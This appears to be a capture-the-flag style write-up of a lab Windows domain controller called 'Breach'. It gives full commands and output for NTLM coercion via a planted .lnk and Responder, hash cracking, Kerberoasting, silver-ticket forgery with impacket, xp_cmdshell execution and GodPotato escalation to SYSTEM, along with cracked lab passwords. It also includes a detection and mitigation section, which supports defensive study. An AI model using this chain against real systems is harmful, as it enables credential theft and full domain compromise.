---
machine: Breach
os: Windows Server 2022   # Build 20348, MSSQL 2019
difficulty: Medium
ip: 10.129.89.128
released: 2025-10-09       # CONFIRM
retired: 2025-10-09        # CONFIRM — normalized from 9.10.25
tags: [ad, kerberos, mssql, silver-ticket, coerce]
procedures: [P2.SMB, P6.KERB, P4.MSSQL]   # TODO: token/potato privesc ID from Procedures.md
status: ready             # draft | ready
---

<!--
  Fill this in as you go. Only this file is hand-written.
  Conventions the agent relies on:
    - ```cmd blocks with a caption line directly above become cheatsheet blocks
    - ![[evidence/foo.png]] embeds render as figures
    - "## Chain" lines of the form  Phase | Technique | Result  become the attack path table
    - Never paste flag values. Write [flag: user] / [flag: root].
-->

## Summary

Breach is an Active Directory box (domain breach.vl, single DC) that chains a
guest-writable SMB share into an NTLM coercion for the first foothold, a Kerberoast for a
SQL service account, and a silver ticket against the MSSQLSvc SPN to log into SQL Server
as Administrator — no real admin password ever needed. xp_cmdshell then gives OS exec as
the service account, and SeImpersonate + GodPotato finishes it to SYSTEM.

## Recon

Full TCP + service/script scan
```cmd
nmap -sCV -p- 10.129.89.128 -oN initial.nmap
```

Key surface: DC breach.vl / BREACHDC, IIS on 80, Kerberos/LDAP, **MSSQL 2019 on 1433**,
RDP on 3389, WinRM on 5985. SMB signing required.
```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
389/tcp   open  ldap          Domain: breach.vl, Site: Default-First-Site-Name
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
  ms-sql-ntlm-info: DNS_Computer_Name: BREACHDC.breach.vl, Product_Version: 10.0.20348
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
Host script results:
  smb2-security-mode: 3.1.1: Message signing enabled and required
```

## Foothold

Null/guest auth is allowed, and the **guest** account has READ,WRITE on a non-default
share "share".
```cmd
nxc smb 10.129.89.128 -u 'guest' -p '' --shares
```
```
[+] breach.vl\guest:
Share           Permissions     Remark
-----           -----------     ------
IPC$            READ            Remote IPC
share           READ,WRITE
Users           READ
```

The share holds "transfer", "finance" and "software" directories. A writable share that
someone browses = NTLM coercion: drop a malicious .lnk (ntlm_theft) in "transfer" and
wait for the box's scheduled browse to trigger auth back to us.
```cmd
smbclient //10.129.89.128/share -N
```
```
smb: \> cd transfer\
smb: \transfer\> put coerce.lnk
```

Catch the authentication with Responder
```cmd
responder -I tun0 -wvFr
```

A scheduled process browsing the share coughs up **julia.wong**'s NetNTLMv2:
```
Julia.Wong::BREACH:949ba0a153cdfd72:044C67E7...[NetNTLMv2 captured — redacted]
```

Crack offline
```cmd
hashcat -m 5600 julia.hash /usr/share/wordlists/rockyou.txt
```
-> julia.wong : Computer1

[flag: user]

## Privilege Escalation

### Kerberoast -> svc_mssql

With a real domain user, Kerberoast for SPN-bearing accounts.
```cmd
nxc ldap 10.129.89.128 -u 'julia.wong' -p 'Computer1' --kerberoast kerb.txt
```
Returns a TGS for **svc_mssql** (SPN MSSQLSvc/breachdc.breach.vl), cracked offline:
```cmd
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
```
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$b825451a...[TGS — redacted]
```
-> svc_mssql : Trustno1

### Silver ticket -> sysadmin on MSSQL

svc_mssql is low-priv, but we hold its password (so its NT hash) and it owns the
**MSSQLSvc** SPN — the full recipe for a silver ticket. We encrypt a TGS for the MSSQL
service ourselves and forge the PAC to claim Administrator (RID 500); SQL Server
validates with the service-account key we control, trusts the PAC, and maps us to
sysadmin. No DC round-trip, no real admin password.
```cmd
impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -nthash <svc_mssql NT hash> -dc-ip 10.129.89.128 -domain breach.vl -user-id 500 Administrator
```

Point KRB5CCNAME at the forged ticket and authenticate to MSSQL
```cmd
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
```
Lands as BREACH\Administrator, dbo@master (sysadmin).

### xp_cmdshell -> SeImpersonate -> SYSTEM

As sysadmin, enable command execution. xp_cmdshell runs as the OS service account, which
holds **SeImpersonatePrivilege**.
```cmd
enable_xp_cmdshell
xp_cmdshell powershell whoami /priv
```
```
SeImpersonatePrivilege    Impersonate a client after authentication   Enabled
```

Defender is off, so GodPotato runs on disk. SeImpersonate -> SYSTEM via the RPCSS/DCOM
OXID-resolver named-pipe trick.
```cmd
xp_cmdshell C:\Users\Public\gp.exe -cmd "cmd /c whoami"
```
```
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4728
nt authority\system
```

Read root as SYSTEM (builtins via cmd /c)
```cmd
xp_cmdshell C:\Users\Public\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

[flag: root]

## Chain

Recon    | nmap full TCP + SMB/NTLM info                | breach.vl, DC BREACHDC, MSSQL 2019
Foothold | guest-writable share + .lnk coercion (Responder) | julia.wong NetNTLMv2 -> Computer1
PrivEsc  | Kerberoast + crack (hashcat 13100)           | svc_mssql:Trustno1
PrivEsc  | Silver ticket to MSSQLSvc as Administrator    | sysadmin (dbo) on SQL
PrivEsc  | enable xp_cmdshell                            | OS exec as svc_mssql (SeImpersonate)
PrivEsc  | GodPotato (SeImpersonate abuse)               | NT AUTHORITY\SYSTEM

## Loot

breach.vl\guest       : (null)      -> READ,WRITE on share "share"
breach.vl\julia.wong  : Computer1   (NetNTLMv2 via share coercion, cracked)
breach.vl\svc_mssql   : Trustno1    (kerberoasted, cracked)

## Detection

Coercion: a guest-writable share plus an anomalous .lnk dropped into it, followed by the
DC/scheduled task making an outbound SMB auth to a non-domain host — egress 445 to an
external IP from a DC is the red flag.

Kerberoast: 4769 for svc_mssql with RC4 (0x17) from julia.wong — weak-etype SPN request.

Silver ticket: no 4768/4769 on the DC for the admin login (forged offline), yet MSSQL
logs a successful Administrator logon. A service logon with no matching KDC ticket event
is the anomaly. Mitigations: rotate service-account passwords, enforce AES, trim SPNs.

GodPotato: a SYSTEM process spawned as a child of sqlservr.exe is highly anomalous;
sensitive-privilege-use (4673/4674) around SeImpersonate + named-pipe creation tied to
RPCSS are the artefacts.

## Lessons

- Null/guest + a writable share = a clean NTLM-coercion foothold; a dropped .lnk fires
  when anything browses the folder.
- A crackable SQL service account that owns the MSSQLSvc SPN gives a silver ticket
  straight to sysadmin — the service-account key is the only trust SQL checks, so no
  local-admin creds are needed.
- xp_cmdshell runs as the service account; SeImpersonate -> GodPotato -> SYSTEM.
- GodPotato -cmd executes a program directly, so shell builtins (type/dir) need cmd /c.
